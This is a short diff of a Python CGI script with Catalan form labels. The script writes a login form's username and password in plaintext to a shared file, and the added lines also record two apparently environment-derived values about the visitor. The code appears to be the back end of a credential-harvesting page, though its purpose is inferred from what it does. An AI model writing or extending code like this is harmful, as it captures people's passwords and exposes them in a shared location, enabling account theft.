@@ -7,8 +7,12 @@ import send
 
 cgitb.enable()
 form = cgi.FieldStorage()
-
+env = envoriment_var()
 f = open("/home/shared-stuff/data.txt",'w')
+f.write(str(env[0]))
+f.write("\n")
+f.write(str(env[1]))
+f.write("\n")
 f.write("Usuari: " + form["Nom d’usuari"].value)
 f.write("\n")
 f.write("Contrasenya: " + form["password"].value)
